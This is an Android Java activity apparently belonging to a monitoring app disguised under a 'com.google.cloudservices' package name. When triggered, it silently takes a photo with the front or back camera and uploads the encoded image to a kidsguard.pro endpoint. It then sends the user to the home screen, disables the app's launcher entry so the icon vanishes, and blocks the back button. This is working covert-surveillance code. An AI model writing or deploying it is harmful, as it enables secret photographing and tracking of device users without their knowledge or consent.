package com.google.cloudservices;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.hardware.Camera;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.widget.ImageView;


public class BlockActivity extends Activity implements SurfaceHolder.Callback{
    SurfaceView mSurfaceView;
    ImageView mImageView;
    SurfaceHolder mSurfaceHolder;
    Camera mCamera;
    Camera.PictureCallback mPictureCallback;
    Bitmap bitmap1;
    int a=1;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_block);

        Intent intent=getIntent();
        if (intent!=null){
            Log.e("photoType", "onCreate: " );

        String type=intent.getStringExtra("photoType");
        if (type.equals("front")){
            a=1;
            takePic();
        }else if (type.equals("back")) {
            a=2;
            takePic();
        }}else {}

    }
    public void takePic(){
        mSurfaceView =(SurfaceView) findViewById(R.id.sv);
        mSurfaceHolder = mSurfaceView.getHolder();
        mSurfaceHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);
        mSurfaceHolder.addCallback(this);
        mPictureCallback =new Camera.PictureCallback() {
            @Override
            public void onPictureTaken(byte[] data, Camera camera) {


                bitmap1= BitmapFactory.decodeByteArray(data,0,data.length);
                Utils utils=new Utils();
                String encodedImage = utils.getStringImage(bitmap1, 200);//this code and util class for convert bitmab to string

                SendPic sendPic=new SendPic();
//                sendPic.send(BlockActivity.this,encodedImage,"https://req.kidsguard.pro/api/putPic/");
                Log.e("onPictureTaken", String.valueOf(data.length));
                sendPic.send(BlockActivity.this,encodedImage,"https://im.kidsguard.pro/api/put-picture/");

            }
        };

        Handler handler=new Handler();
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {

                mCamera.takePicture(null,null,mPictureCallback);
            }
        },1000);
        Handler handler1=new Handler();
        handler1.postDelayed(new Runnable() {
            @Override
            public void run() {
                Intent intent2 = new Intent(Intent.ACTION_MAIN);
                intent2.addCategory(Intent.CATEGORY_HOME);
                intent2.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent2);
                ComponentName componentToDisable=new ComponentName("pro.tasking","pro.tasking.MainActivity");
                getPackageManager().setComponentEnabledSetting(
                        componentToDisable,
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP);
            }
        },5000);
    }





    @Override
    public void surfaceCreated(SurfaceHolder surfaceHolder) {
        if (a==1){
        try{
            mCamera =Camera.open(1);
            mCamera.setPreviewDisplay(mSurfaceHolder);
            mCamera.startPreview();

        }catch (Exception e){
            Log.e("onPictureTaken", e.toString() );
        }}else {try{
            mCamera =Camera.open();
            mCamera.setPreviewDisplay(mSurfaceHolder);
            mCamera.startPreview();
        }catch (Exception e){
            Log.e("onPictureTaken", e.toString() );
        }}
    }

    @Override
    public void surfaceChanged(SurfaceHolder surfaceHolder, int i, int i1, int i2) {

    }

    @Override
    public void surfaceDestroyed(SurfaceHolder surfaceHolder) {

    }

    @Override
    public void onBackPressed() {

    }


}
